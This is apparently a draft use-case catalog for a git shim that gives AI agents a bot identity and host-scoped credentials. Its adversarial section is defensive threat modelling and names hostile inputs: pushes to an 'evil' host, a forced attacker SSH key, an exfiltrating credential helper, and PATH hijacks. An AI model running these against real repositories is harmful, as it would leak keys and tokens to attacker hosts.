# Use-Case Catalog: Git Author Identity Shim

**Feature**: [spec.md](../spec.md) · **Created**: 2026-09-06 · **Status**: Draft for review

## Purpose and Method

This catalog enumerates the concrete situations the `git` shim must handle, so that the user
stories and functional requirements rest on observed behavior rather than assumption. Four
read-only scouts investigated separate domains (authoring, transport and credentials,
activation and safety, and adversarial security), each under a strict citation rule: any claim
about git's own behavior carries a git-scm.com URL with a quoted phrase, or it is marked
`[UNVERIFIED]`. At integration I kept that discipline: statements below labeled `[UNVERIFIED]`
are not established fact and must be confirmed during planning before any requirement depends on
them.

### The Four Planes

Every case touches one or more of four independent planes. The shim owns the first three; the
fourth is out of scope.

1. Committer identity: `user.name`/`user.email`, the `GIT_AUTHOR_*` and `GIT_COMMITTER_*`
   variables, and the tagger on annotated tags.
2. HTTPS credentials: a host-scoped credential helper. HTTP(S) only.
3. SSH credentials: a key selected through `core.sshCommand`/`GIT_SSH_COMMAND` or `ssh_config`.
4. Hosting-API account (for example `gh`): outside a git shim, noted where it misleads.

### Legend

`[DISCUSSED]` already resolved in the current spec. `[NEW]` surfaced by this exercise. `[EDGE]`
an edge case. `[UNVERIFIED]` a native-git claim not yet confirmed against docs. `[TENSION Pn]`
challenges pending assumption P1, P2, or P3. Identity classes follow the confirmed rule:
originating (author and committer both bot) versus carrying (author preserved, committer bot).

## Verified Native-Git Facts (citations)

These load-bearing facts are cited; the shim's behavior is designed around them.

- Author and committer are independent fields; "the author is the person who originally wrote
  the work, whereas the committer is the person who last applied the work"
  (https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History).
- Identity source and precedence: "Author and committer information is taken from the following
  environment variables, if set" (`GIT_AUTHOR_*`, `GIT_COMMITTER_*`); "author.name and
  committer.name ... override user.name and user.email if set and are overridden themselves by
  the environment variables"; absent those, `user.*`, then the `EMAIL` variable
  (https://git-scm.com/docs/git-commit).
- `-c`/`--config-env` on the command line "override values from configuration files"
  (https://git-scm.com/docs/git); `GIT_CONFIG_COUNT` pairs "will be overridden by any explicit
  options passed via git -c" (https://git-scm.com/docs/git-config).
- `--amend`: "The new commit has the same parents and author as the current one (the
  --reset-author option can countermand this)" (https://git-scm.com/docs/git-commit).
- `-C`/`--reuse-message` and `-c`/`--reedit-message`: "reuse the log message and the authorship
  information (including the timestamp)" (https://git-scm.com/docs/git-commit).
- `--reset-author`: "When used with -C/-c/--amend options, or when committing after a
  conflicting cherry-pick, declare that the authorship of the resulting commit now belongs to
  the committer" (https://git-scm.com/docs/git-commit).
- `--author`: "Override the commit author"; a non-standard-format value "is assumed to be a
  pattern and is used to search for an existing commit by that author"
  (https://git-scm.com/docs/git-commit).
- `--fixup`/`--squash`: "Neither fixup! nor amend! commits change authorship of commit when
  applied by git rebase --autosquash" (https://git-scm.com/docs/git-commit).
- Merge: `--no-ff` "create a merge commit in all cases"; fast-forward creates none; `--squash`
  does "not ... record $GIT_DIR/MERGE_HEAD"; more than one commit "will create a merge with more
  than two parents"; conclude a conflicted merge with "git merge --continue"
  (https://git-scm.com/docs/git-merge).
- Revert "record some new commits" (https://git-scm.com/docs/git-revert); `--continue` uses
  `.git/sequencer`; `-n` "does not ... make the commits".
- Cherry-pick applies existing commits "recording a new commit for each"; `-x` appends a
  trailer; `--ff` may fast-forward. It sets `CHERRY_PICK_HEAD` only when a pick cannot apply
  cleanly and it stops: "The CHERRY_PICK_HEAD ref is set to point at the commit that introduced
  the change that is difficult to apply" (https://git-scm.com/docs/git-cherry-pick). A clean
  pick records the commit directly and leaves no such ref. Author preservation is not stated on
  the cherry-pick page, but is confirmed through git-commit's `--reset-author` wording (an
  opt-in to move authorship to the committer implies the default preserves the original author).
- Rebase: replay "is similar to running git cherry-pick" per commit; `rebase.backend` is "apply
  or merge"; a squash fold "will be attributed to the author of the first commit"; `--exec`
  "Append exec cmd after each line creating a commit"; `--committer-date-is-author-date` and
  `--reset-author-date` change dates only (https://git-scm.com/docs/git-rebase).
- `am`: "The commit author name is taken from the From: line"; committer date is commit time;
  `--continue` makes the commit "using the authorship and commit log extracted from the e-mail"
  (https://git-scm.com/docs/git-am).
- Stash: "A stash entry is represented as a commit"; `create` yields "a regular commit object"
  (https://git-scm.com/docs/git-stash). The author/committer of the stash commits is not stated:
  `[UNVERIFIED]`.
- Notes: "Every notes change creates a new commit at the specified notes ref ... the commit
  authorship is determined according to the usual rules (see git-commit[1])"
  (https://git-scm.com/docs/git-notes).
- Tags: a lightweight tag is just a ref; an annotated tag object holds "the tagger name and
  e-mail, a tagging message"; "To set the date used in future tag objects, set the environment
  variable GIT_COMMITTER_DATE"; signing without `-u` uses "the committer identity for the
  current user" (https://git-scm.com/docs/git-tag). That `GIT_COMMITTER_NAME`/`EMAIL` populate
  the tagger line is implied but `[UNVERIFIED]` on that page.
- `commit-tree` "Creates a new commit object" and uses the identity environment variables "as
  its primary source" (https://git-scm.com/docs/git-commit-tree,
  https://git-scm.com/book/en/v2/Git-Internals-Environment-Variables).
- `filter-branch` exports the original `GIT_AUTHOR_*`/`GIT_COMMITTER_*` "in order to affect the
  author and committer identities of the replacement commit created by git-commit-tree"
  (https://git-scm.com/docs/git-filter-branch). `git filter-repo` is not a builtin.
- Credential helpers define context "by a URL"; "Git compares hostnames exactly"; path ignored
  unless `useHttpPath`; an empty helper "resets the helper list to empty"
  (https://git-scm.com/docs/gitcredentials, https://git-scm.com/docs/git-config).
- `pushurl` "is used for pushing instead of remote.<name>.url"; a remote may have multiple URLs,
  "the first is used for fetching, and all are used for pushing"; `insteadOf` rewrites URLs with
  "the longest match"; `pushInsteadOf` rewrites only for pushing and is ignored when an explicit
  `pushurl` exists (https://git-scm.com/docs/git-config).
- `GIT_SSH_COMMAND` "takes precedence over GIT_SSH, and is interpreted by the shell" and
  overrides `core.sshCommand` (https://git-scm.com/docs/git, https://git-scm.com/docs/git-config).
- Real-git dispatch: builtins live under `GIT_EXEC_PATH`; a non-builtin `git-<command>` is found
  "in a directory on $PATH"; `git version` "Prints the Git suite version"
  (https://git-scm.com/docs/git).
- `-C <path>` runs "as if git was started in <path>"; `--git-dir`/`GIT_DIR` "turns off the
  repository discovery" (https://git-scm.com/docs/git).
- Trace redaction: Git redacts `Authorization` and similar by default; `GIT_TRACE_REDACT=false`
  disables it; `GIT_TRACE_CURL` dumps "all incoming and outgoing data" (https://git-scm.com/docs/git).
- Aliases: git "finds the command before trying the alias"; an alias "prefixed with an
  exclamation point ... will be treated as a shell command"; aliases hiding existing commands
  are ignored (https://git-scm.com/docs/git-config).
- Hooks: Git changes directory to the worktree root or `$GIT_DIR`; exports `GIT_DIR`,
  `GIT_WORK_TREE`; sets `GIT_EDITOR=:` when no editor will open; `--no-verify` bypasses
  `pre-commit`/`commit-msg` but not `prepare-commit-msg` (https://git-scm.com/docs/githooks,
  https://git-scm.com/docs/git-commit).
- Worktrees: `$GIT_DIR` points to the private `worktrees/<id>` dir, `$GIT_COMMON_DIR` to the
  main one, and "the repository config file is shared across all worktrees"
  (https://git-scm.com/docs/git-worktree). `includeIf gitdir:` matches the real `.git` location,
  not the `.git` file.

## A. Authoring and History (committer-identity plane)

Default context: agent marker present, mode `auto`, a bot identity resolves at repository level.

| UC | Command | Class | Author / Committer / Tagger | Notes |
|----|---------|-------|------------------------------|-------|
| A1 | `git commit -m "…"` (also `-a`, pathspec, `--allow-empty`) | originating | bot / bot | [DISCUSSED] |
| A2 | `git commit` (editor opens) | originating | bot / bot | [DISCUSSED] stdin/editor passthrough; hooks see bot |
| A3 | `git commit --dry-run` | none | no commit | [NEW][EDGE] creates nothing; allow even if identity unresolved |
| A4 | `git commit` with no identity resolved | refused | none | [DISCUSSED] fail-safe write |
| A5 | `git commit --amend --no-edit` (human tip) | carrying | preserve human / bot | [DISCUSSED] |
| A6 | `git commit --amend` (bot tip) | carrying | bot preserved / bot | [DISCUSSED] |
| A7 | `git commit --amend --reset-author` | originating | bot / bot | [DISCUSSED][EDGE] |
| A8 | `git commit -C <c>` / `--reuse-message` (also `-c`/`--reedit-message`) | carrying | reuse named / bot | [DISCUSSED] must not set `GIT_AUTHOR_*` |
| A9 | `git commit --author="A <a@x>"` | explicit | argv author / bot | [NEW][EDGE] respected, never overridden |
| A10 | `git commit --author=<pattern>` | explicit | matched author / bot | [NEW][EDGE] git searches history |
| A11 | `git commit --fixup=<c>` / `--squash=<c>` | originating | bot / bot | [NEW] the fixup! commit; later fold is carrying |
| A12 | `git merge --no-ff <b>` (also octopus) | originating | bot / bot | [DISCUSSED] |
| A13 | `git merge --ff-only <b>` | none | no commit | [NEW][EDGE] |
| A14 | conflicted merge then `git commit` or `git merge --continue` | originating | bot / bot | [DISCUSSED] detect `MERGE_HEAD` |
| A15 | `git merge --squash <b>` then `git commit` | originating (non-merge) | bot / bot | [NEW][EDGE] no `MERGE_HEAD` recorded |
| A16 | `git revert <c>` / `--continue` / conflict then `git commit` | originating | bot / bot | [DISCUSSED] reverter is author |
| A17 | `git cherry-pick <c>` (clean; `-x`; `--continue`) | carrying | preserve original / bot | [DISCUSSED] preservation CONFIRMED via git-commit `--reset-author` |
| A18 | conflicted cherry-pick then bare `git commit` | carrying | preserve original / bot | [DISCUSSED] detect `CHERRY_PICK_HEAD` |
| A19 | `git cherry-pick --ff <c>` that fast-forwards | none | no new object | [NEW][EDGE] |
| A20 | `git cherry-pick -n <c>` then `git commit` | ? | with no leftover `CHERRY_PICK_HEAD`, git classifies it originating (bot author), which WRONGLY re-authors the pick | [NEW][EDGE] `[UNVERIFIED]`; must pin empirically; wrong-by-default risk |
| A21 | `git rebase <b>` (merge and apply backends, `--continue`) | carrying | preserve original / bot | [DISCUSSED] |
| A22 | interactive rebase squash/fixup fold | carrying | first commit's author / bot | [NEW][EDGE] |
| A23 | `git rebase --exec "git commit --amend …"` | carrying | preserve / bot | [NEW][EDGE] inner git re-enters shim |
| A24 | `git rebase --committer-date-is-author-date` / `--reset-author-date` | carrying | names preserved / bot | [NEW][EDGE] dates only; shim does not manage dates |
| A25 | `git am <mbox>` / `--continue` / `--ignore-date` | carrying | From: line / bot | [DISCUSSED] am not in FR-031 sequencer list |
| A26 | `git pull` (ff) / `--no-rebase` (merge) / `--rebase` | per result | ff none; merge originating; rebase carrying | [NEW] fetch is transport plane |
| A27 | `git stash push` / `git stash create` | originating (recommended) | bot / bot `[UNVERIFIED]` native | [NEW][EDGE] spec gap; may hit fail-safe |
| A28 | `git notes add` / `copy` / `merge --commit` | originating (notes ref) | bot / bot | [NEW] spec gap; cited authorship |
| A29 | `git tag v1` (lightweight) | none | no tag object | [NEW] |
| A30 | `git tag -a v1 -m …` (annotated) | originating tag | tagger = bot (committer-like) | [NEW][EDGE] SPEC GAP; committer identity drives tag date and signing (cited); literal name/email to tagger inferred, uncited on git-scm |
| A31 | `git tag -s v1` (signed) | originating tag | tagger = bot; signing out of scope | [NEW][EDGE] may fail if operator signing key |
| A32 | `git filter-branch …` (nested `commit-tree`) | carrying | preserve exported env / bot | [NEW][EDGE] originating would destroy history authors |
| A33 | `git filter-repo …` | out of scope | tool rewrites directly | [NEW][EDGE] not a builtin; shim env likely inert |
| A34 | `git commit-tree <tree>` (no author env) | originating | bot / bot | [NEW] plumbing; spec gap |
| A35 | `git commit-tree` with `GIT_AUTHOR_*` preset | preserve only when the shim sentinel is present (git-internal re-entry, e.g. filter-branch); an unmarked preset is caller-supplied and handled per D1 | preserve env author / bot (sentinel) | [NEW][EDGE] sentinel distinguishes git's own nested re-authoring from ordinary callers; correctness mechanism, not a trust boundary |
| A36 | `git commit -S` (sign) | per class | identity per class; signing out of scope | [NEW] pass `-S` through |
| A37 | `git commit --date=…` / `GIT_AUTHOR_DATE` | per class | bot name, requested date | [NEW] shim manages names, not dates |
| A38 | abort/skip: `git rebase --abort`, `git merge --abort`, `git cherry-pick --abort`, `git rebase --skip` | none | no commit | [NEW] |
| A39 | `git replace --edit <obj>` / `--graft <c> [<p>…]` | carrying (recommended) | preserve original / bot | [NEW][EDGE] creates a replacement commit via commit-tree; same rule as A32/A35; scope decision needed |

## B. Transport and Credentials (SSH and HTTPS planes)

Recurring rule: git chooses the transport; the shim scopes the bot key or token to the matched
host and never presents it to any other host. Several cases below name a remote or raw URL on
the command line, which is a genuine refinement of P1 (see Open Questions).

| UC | Command | Plane | Expected effect | Notes |
|----|---------|-------|-----------------|-------|
| B1 | `git clone git@github.com:acme/r.git` | SSH | host from argv URL; bot key for that host; creates `remote.origin.url` | [NEW][TENSION P1] no repo yet, match argv |
| B2 | `git clone https://github.com/acme/r.git` | HTTPS | bot token for host via child-scoped helper; never in URL | [NEW][TENSION P1] |
| B3 | `git clone /path` or `file://` or `git://` or `<bundle>` | none | no bot key/token; native transport does no auth | [NEW] |
| B4 | `git fetch` / `git fetch origin` / `git fetch --all` | SSH/HTTPS | read; proceeds without identity; per-remote host scoping | [DISCUSSED] read passthrough; `--all` multi-host [TENSION P1] |
| B5 | `git fetch https://…/other.git <ref>` (raw URL) | HTTPS | creds follow contacted host; committer identity still repo-level | [NEW][EDGE][TENSION P1] |
| B6 | `git push origin HEAD` (SSH/HTTPS; `-u`; `--force`; `--tags`) | SSH/HTTPS | write; bot creds matched host only; flags do not change plane | [DISCUSSED] |
| B7 | `git push <raw-url> HEAD` | SSH/HTTPS | creds follow contacted host | [NEW][EDGE][TENSION P1] |
| B8 | `git push <group>` / remote with multiple URLs | mixed | each URL independently; bot creds only matched host | [NEW][EDGE][TENSION P1] |
| B9 | `git pull` / `--no-rebase` / `--rebase` | SSH/HTTPS + identity | fetch with bot creds; merge originating or rebase carrying | [NEW] see A26 |
| B10 | `git remote add [-f] <name> <url>` | none/SSH/HTTPS | stores URL (adds to P1 match set); `-f` fetches | [NEW] hostile remote can enter match set (see D) |
| B11 | `git remote set-url --push origin <ssh-url>` | none | later pushes use pushurl | [NEW] |
| B12 | fork on same host as upstream | SSH/HTTPS | one bot key covers host; different accounts need SSH aliases | [NEW][TENSION P2] |
| B13 | upstream on another host | SSH/HTTPS | push bot creds to matched host; fetch upstream uses operator creds | [DISCUSSED][TENSION P1] |
| B14 | monorepo: push github then gitlab | SSH/HTTPS | one committer identity; bot creds only to its matched host | [NEW][EDGE][TENSION P1,P2] |
| B15 | `pushurl` differs from fetch url (same or different host) | SSH/HTTPS | fetch uses url, push uses pushurl; match must include both | [NEW][EDGE][TENSION P1] CONFIRMED: native `hasconfig:remote.*.url` scans `.url` only, not `pushurl` (git-config) |
| B16 | `url.<base>.insteadOf` / `pushInsteadOf` rewrites | SSH/HTTPS | effective host is the rewritten URL; `hasconfig` does not see rewrites | [NEW][EDGE][TENSION P1,P2] must honor without editing operator config |
| B17 | SSH `Host` alias not equal to real hostname | SSH | ssh matches the alias; inject `GIT_SSH_COMMAND`/`-F` with `IdentitiesOnly` + bot key | [NEW][EDGE][TENSION P1,P2] |
| B18 | `GIT_SSH_COMMAND` already set by caller | SSH | caller value wins over `core.sshCommand`; compose, do not silently drop | [NEW][EDGE] |
| B19 | missing bot SSH key file | refused | refuse write with actionable message; never fall through to operator key | [NEW][EDGE] |
| B20 | host-scoped HTTPS helper over operator helper | HTTPS | reset helper list for that host then shim helper; token from env/file/command | [NEW] must not persist bot token to operator store |
| B21 | `credential.useHttpPath=true` | HTTPS | path-scoped matching; do not emit bot token for another path | [NEW][EDGE] |
| B22 | username embedded in HTTPS URL | HTTPS | honor bot username; never write password into URL | [NEW][EDGE] |
| B23 | `GIT_TERMINAL_PROMPT=0` / non-interactive | HTTPS | succeed or fail closed; never GUI-prompt for operator creds | [NEW][EDGE] |
| B24 | missing bot HTTPS token | OPEN | fail closed recommended; do not fall through to operator helper | [NEW][EDGE] needs an FR |
| B25 | `git clone --recurse-submodules` / `git submodule update` | SSH/HTTPS | per-submodule host creds; foreign host uses operator creds | [NEW][EDGE][TENSION P1] |
| B26 | `git submodule foreach 'git …'` | mixed | inner git re-enters shim; identity per submodule repo | [NEW][EDGE] |
| B27 | Git LFS over HTTPS or SSH | HTTPS/SSH | LFS reuses helper/ssh; bot creds matched host; no token in logs | [NEW][EDGE] LFS `GIT_SSH_COMMAND` on Windows `[UNVERIFIED]` |
| B28 | shallow / partial clone (`--depth`, `--filter`) | SSH/HTTPS | same creds as full clone; later promisor fetches reuse them | [NEW] |
| B29 | `git ls-remote <url>` | SSH/HTTPS | read; host from argv | [NEW][TENSION P1] transports `[UNVERIFIED]` |
| B30 | operator runs any transport (marker absent) | inert | operator creds unchanged; config files untouched | [DISCUSSED] |
| B31 | HTTPS push with `credential.helper=cache` (cache daemon) | HTTPS | bot token must not persist into a cache daemon the operator later queries; use an isolated socket or refuse | [NEW][EDGE] token bleed across time, not just host (SC-006) |

## C. Activation, Configuration, and Safety

| UC | Command / Trigger | Expected effect | Notes |
|----|-------------------|-----------------|-------|
| C1 | auto + recognized marker | act as bot | [DISCUSSED] |
| C2 | auto + no marker | act as operator (inert) | [DISCUSSED] |
| C3 | auto + unrecognized marker | act as operator | [DISCUSSED][EDGE] |
| C4 | mode `agent` (no marker) | force bot; refuse if none resolves | [DISCUSSED] |
| C5 | mode `human` (marker present) | force operator; no bot key/token | [DISCUSSED] |
| C6 | explicit mode versus vendor detection | mode wins | [DISCUSSED] |
| C7 | operator disables vendor auto-detection | auto acts as operator unless mode `agent` | [NEW] |
| C8 | operator adds a custom marker | recognized as bot; removing it reverts | [NEW] |
| C9 | CI runner, no marker, mode unset | inert; must set mode `agent` to stamp bot | [NEW][EDGE] |
| C10 | bot run, no matching identity: write | refused, actionable message; no commit | [DISCUSSED] |
| C11 | same state: local read (`status`, `log`, `diff`) | passthrough | [DISCUSSED] |
| C12 | same state: remote read (`fetch`) | allowed; operator creds since no bot identity | [NEW][EDGE] |
| C13 | same state: `push` | refused | [DISCUSSED] |
| C14 | unconfigured write under human override | proceeds as operator; config untouched | [DISCUSSED] |
| C15 | write taxonomy: tag / notes / stash / rebase | any commit-creating op is a write and is refused when unresolved | [NEW][EDGE] tagger identity `[UNVERIFIED]` |
| C16 | identity only in operator-global config | bot from global; secrets from env/file/command | [NEW] |
| C17 | untrusted repo-local config | ignored; identity from global only; secrets never read | [DISCUSSED][TENSION P3] |
| C18 | first-time content-hash trust | hash stored operator-side (not in repo); overrides honored for identity selection only | [DISCUSSED] |
| C19 | edit of trusted file revokes grant | treated as untrusted; actionable message | [DISCUSSED] |
| C20 | trusted repo-local config referencing an operator-store token | honored; secret still not read from repo | [NEW] |
| C21 | explain / dry-run inspection | prints resolved author, committer, transport, credential source, cwd, host; executes nothing | [DISCUSSED] must not collide with `git commit --dry-run` |
| C22 | explain redacts secrets | shows `env:NAME` or key path, never secret bytes | [DISCUSSED] |
| C23 | explain in unconfigured / untrusted / human modes | shows the decision; executes nothing | [NEW] |
| C24 | operator git untouched after repeated use | `~/.gitconfig` and `~/.ssh/config` byte-identical | [DISCUSSED] |
| C25 | ambient shell / PATH not mutated | only child env augmented | [NEW] |
| C26 | PATH self-recursion | shim must locate and exec the real git, never itself; finite process tree | [NEW][EDGE] MISSING FR |
| C27 | builtins via `GIT_EXEC_PATH`; external `git-<cmd>` on PATH | must not break dispatch or recurse | [NEW][EDGE] MISSING FR |
| C28 | alias expansion re-invokes git (incl. `!shell`) | classify after expansion or fail closed; nested git safe | [NEW][EDGE] |
| C29 | hook calls git (nested; exported `GIT_DIR`) | inner git is real git; inherits bot identity so hooks observe bot | [DISCUSSED] hook; [NEW] nested re-entry |
| C30 | `git -C` / `--git-dir` / `GIT_DIR` not from worktree cwd | identity resolved for the target repository, not the process cwd | [NEW] |
| C31 | Windows `git.exe`/`git.cmd` resolution | locate real git via PATHEXT; same bot identity as POSIX; not the shim again | [DISCUSSED] |
| C32 | paths with spaces / quoting | argv intact; no word-splitting; secrets never on argv | [DISCUSSED][EDGE] |
| C33 | Windows HOME rules for operator config | documented relative to Git's HOME or an explicit path, not a silent third home | [NEW][EDGE] |
| C34 | per-invocation overhead; no network at resolve time | local resolution; cache real-git path and trust hashes | [NEW] |
| C35 | concurrent invocations (same and different repos) | no shared mutable identity; each resolves independently | [NEW][EDGE] |
| C36 | editor / stdin passthrough (`git commit`, `-F -`, `GIT_EDITOR=:`) | shim never drains stdin or strips `GIT_EDITOR`; bot identity still applied | [DISCUSSED] + [NEW] |
| C37 | hooks: `core.hooksPath`, `--no-verify`, `pre-push` nested reads | passthrough; bot env visible; hook inner commands are reads | [NEW][EDGE] |
| C38 | `git config --get user.email` under bot | reads files (operator), not injected env; shim must not rewrite config to make `--get` match the commit | [NEW][EDGE] observable identity split |
| C39 | agent `git config --global/--local/--worktree …` | delegated to real git (it may write config because the user asked); shim never writes config itself | [NEW][EDGE] |
| C40 | `git -c user.email=…` inline | bot env still wins in bot mode; do not drop caller `-c` | [NEW][EDGE] |
| C41 | detached HEAD commit as bot | originating; identity from remotes, not branch; must not copy `onbranch` fail-closed | [NEW][EDGE][TENSION P1] |
| C42 | `git worktree add` and commit inside a linked worktree | not a commit itself; inner commit uses shared remotes (same identity); sequencer via `--git-path` | [NEW][EDGE] |
| C43 | interrupt (Ctrl+C) during editor or push | signal forwarded; no partial bot commit | [DISCUSSED] |
| C44 | real git missing or resolves to the shim | loud actionable error; never exec a random `git.cmd` | [NEW][EDGE] MISSING FR |
| C45 | `gh pr create` after a bot push | shim does not wrap `gh`; PR may show operator account (documented non-goal) | [NEW] plane 4 |

## D. Adversarial and Security

| UC | Setup / Command | Threat | Expected safe behavior | Notes |
|----|-----------------|--------|------------------------|-------|
| D1 | caller sets `GIT_AUTHOR_*` (no shim sentinel) | forged author beats shim `-c` | originating: overwrite child `GIT_AUTHOR_*`=bot; carrying: REMOVE the caller `GIT_AUTHOR_*` from the child env so git restores the original author; git-internal re-entry (shim sentinel present): preserve | [NEW] candidate FR-PREC + FR-SENTINEL |
| D2 | caller sets `GIT_COMMITTER_*` | forged committer | child `GIT_COMMITTER_*` = bot even when carrying author | [NEW] |
| D3 | `git -c user.*` / `GIT_CONFIG_COUNT` / `--config-env` | config-plane identity spoof | bot env wins; do not drop caller `-c`; secrets not on argv | [NEW] |
| D4 | `EMAIL` / `GIT_AUTHOR_DATE` set | identity/date confusion | bot email used; dates pass through | [NEW] candidate FR-PREC-2 |
| D5 | `GIT_TRACE`, `GIT_TRACE2`, `GIT_TRACE_CURL` | secret leak to trace sinks | no secret in argv/URL/logs; consider forcing `GIT_TRACE_REDACT=true` or refusing | [NEW] candidate FR-LEAK-1 |
| D6 | `-c http.extraHeader='Authorization: Bearer …'` | live token on argv | refuse bot write when argv carries a header secret | [NEW] candidate FR-LEAK-2 |
| D7 | hostile `.git/config` `user.email` / `core.sshCommand` / `insteadOf` | repo redirects identity or transport | ignore untrusted repo-local git config for identity/credential selection; env override; host-scope key | [NEW][TENSION P3] distinct from shim config |
| D8 | hostile `credential.helper='!…'` / `core.askPass` | exfiltration helper | untrusted helper ignored; shim helper at protected/command scope | [NEW][TENSION P3] |
| D9 | hostile `core.hooksPath` | attacker hooks in child env | no secrets in child env; untrusted hooksPath ignored or refuse | [NEW] |
| D10 | trust-file TOCTOU (swap after hash) | raced content honored | hash the bytes actually read; mismatch refuses writes | [NEW] candidate FR-TRUST-1 |
| D11 | `git push git@evil:acme/app.git` while origin is github | bot key offered to argv host | refuse bot-mode write whose destination host is not the matched identity host; do not fall back to operator creds | [NEW][TENSION P1] candidate FR-HOST-1 |
| D12 | `git remote add backup git@evil:…` then commit/push | extra remote hijacks match | ignore remotes whose host is not an operator identity host | [NEW][TENSION P1,P2] candidate FR-HOST-2 |
| D13 | SSH alias `Host github.com HostName evil` | alias spoofing | shim `-F` config with `IdentitiesOnly yes` and pinned HostName; no operator aliases | [NEW][TENSION P2] |
| D14 | `GIT_SSH_COMMAND='ssh -i /tmp/attacker'` | forced attacker key | overwrite child `GIT_SSH_COMMAND` in bot mode | [NEW] |
| D15 | file-based `.git` (gitfile), `GIT_DIR` outside worktree | literal `.git/` detection defeated; identity from foreign repo | resolve via `git rev-parse --git-path`/`--absolute-git-dir`; consider refusing `GIT_DIR` outside the started worktree | [NEW][TENSION P1] |
| D16 | submodule host differs from superproject | one key reused across hosts | per-invoked-repo identity; superproject bot creds not offered to submodule host | [NEW][TENSION P1] |
| D17 | equal-specificity identity tie (github and gitlab both match) | ambiguous selection | refuse writes and name both identities | [NEW][TENSION P1] candidate FR-AMBIG-1 |
| D18 | alias hides a command or expands to `!shell` | misclassification / code exec | expand before classifying or fail closed; ignore untrusted `!` aliases | [NEW][TENSION P3] |
| D19 | `git commit -- --amend` (also `--end-of-options`) | option/pathspec confusion | classify only real options before `--`/`--end-of-options` | [NEW][EDGE] CONFIRMED: args after `--` are pathspecs (gitcli); global options cannot follow `--` |
| D20 | `--no-verify` on commit/push | skip hooks | bot identity still applied; do not drop the flag | [NEW] |
| D21 | non-UTF8 or oversized argv | truncation or crash | well-formed identity env; `E2BIG` fails loudly; never truncate | [NEW][EDGE] `ARG_MAX` `[UNVERIFIED]` |
| D22 | `commit.gpgSign=true`, bot has no key | silent signing bypass | pass through and let git fail; do not silently add `--no-gpg-sign` | [NEW] candidate FR-SIGN-1 |
| D23 | leftover marker in a human shell | false-positive bot attribution | high-specificity markers; `auto` fails closed to human; `human` mode wins | [NEW][EDGE] candidate FR-MARK-1 |
| D24 | `safe.directory` refusal on foreign-owned repo | shim masks the guard | do not set `safe.directory=*`; propagate git's error | [NEW][EDGE] |
| D25 | `GIT_ALLOW_PROTOCOL` / protocol allow-lists | broadened protocols | shim does not broaden protocols | [NEW][EDGE] |
| D26 | `PATH=/tmp/evil:$PATH` or `GIT_EXEC_PATH=/tmp/evil` | hijack real git | resolve real git from operator-configured absolute path, not `which git` | [NEW][EDGE] ties to C26/C44 |
| D27 | caller sets `GIT_CONFIG_GLOBAL` / `GIT_CONFIG_SYSTEM` / `GIT_CONFIG_NOSYSTEM` | config redirection past `~/.gitconfig` | bot identity still wins for author and committer, but transport and credential selection could read attacker config; the shim must derive its decisions from its own config and neutralize or refuse redirected credential/transport config | [NEW][EDGE][TENSION P3] |

## Highlighted Edge Cases Already Discussed

Activation-marker miss (C2, C3); the carrying-versus-originating author rule and its `-c`/`-C`,
amend, cherry-pick, rebase, and `am` forms (A5 through A8, A17, A21, A25); conflicted-sequence
completion (A14, A18); non-configured-host credential scoping (B13, B30); interrupt forwarding
(C43); cross-platform parity (C31, C32); and untrusted repo-local configuration (C17 through
C19, D7).

## Newly Discovered Edge Cases (grouped)

1. Tagger identity on annotated and signed tags is committer-like and absent from the current
   requirements (A30, A31, C15). Likely the single clearest spec gap.
2. Objects that are commits but not `git commit`: stash (A27), notes (A28), the plumbing
   `commit-tree` (A34, A35), `git replace --edit`/`--graft` (A39), and `filter-branch`
   re-authoring history through nested `commit-tree` (A32). Each needs an explicit in-scope or
   out-of-scope decision and a preserve-if-`GIT_AUTHOR_*`-already-set rule for the plumbing path.
3. Nested git and PATH self-recursion (C26, C27, C28, C29, C44, D26): the shim must locate and
   exec the real git, survive hook and alias re-entry, and never loop. No requirement covers
   this today.
4. Caller-supplied identity precedence, three actions plus a sentinel (D1 through D4, A35, C40):
   in bot mode the shim must (a) on originating ops overwrite caller `GIT_AUTHOR_*` and
   `GIT_COMMITTER_*` with the bot; (b) on carrying ops remove the caller `GIT_AUTHOR_*` from the
   child env so git restores the original author, while still forcing `GIT_COMMITTER_*`=bot; and
   (c) always set `GIT_COMMITTER_*` regardless. A preset `GIT_AUTHOR_*` cannot by itself
   distinguish git's own nested re-authoring (filter-branch env-filter, `rebase --exec`) from an
   ordinary caller, so the shim marks the child environment it creates with a sentinel: a preset
   carrying the sentinel is git-internal and preserved, an unmarked preset is caller-supplied and
   handled by (a) or (b). The sentinel is a correctness mechanism, not a security boundary: a
   caller who can set `GIT_AUTHOR_*` can equally set the sentinel, so it separates git's own
   nested invocations from ordinary callers but does not defend against a deliberate forger. The
   caller's other arguments are never discarded.
5. Credential and transport redirection through repo-controlled or caller-controlled config:
   `insteadOf`, `core.sshCommand`, `credential.helper`, `core.askPass`, `core.hooksPath` in
   `.git/config` (D7, D8, D9), and the `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM` redirection
   environment variables (D27). These are distinct from the shim's own per-repo config, yet each
   can redirect identity or credentials.
6. Host mismatch with a resolved identity (D11, D12, B7, B8, B14): identity resolves, but a push
   targets a different, non-matched host. Fail-safe today only covers the no-identity case, so a
   resolved-identity-wrong-host write is currently unguarded.
7. Ambiguous identity selection with equal specificity (D17), which the most-specific rule (P2)
   does not resolve.
8. Effective-host resolution after `insteadOf`, `pushInsteadOf`, `pushurl`, multiple URLs, and
   SSH host aliases (B15, B16, B17, D13): the host that matters for credentials is the
   post-rewrite host, which native `hasconfig` never sees.
9. Secret leakage through trace and header channels (D5, D6), through persisting the bot token
   into the operator's credential store, and specifically through a shared credential-cache
   daemon the operator later queries (B20, B31).
10. Signing interaction: `commit.gpgSign=true` with no bot key, and signed tags (A31, D22).
11. The observable identity split: `git config --get user.email` reads files and returns the
    operator, while the commit records the bot (C38). This is correct but surprising and must be
    documented.
12. Trace/trust timing and integrity: TOCTOU on the trust file (D10).

## Open Questions and P1 / P2 / P3 Tensions

- P1 refinement (strong): commands that name a remote or URL and either have no repository
  (`clone`) or contact a raw URL (`fetch`/`push`/`ls-remote <url>`) cannot resolve identity from
  repository remotes. The clean split the scouts converged on: committer identity is
  repository-level (P1) whenever a repository exists; credentials are always host-scoped to the
  host actually contacted, which for `clone` and raw-URL operations is the argv URL. P1 should
  state this refinement rather than treat these as contradictions (B1, B2, B5, B7, B29, D15).
- Non-matched-host writes with a resolved identity: refuse, or fall back to operator creds?
  Recommendation is refuse in bot mode (D11, B14). Needs an FR.
- Missing bot credential (SSH key file or HTTPS token absent): fail closed, or fall through?
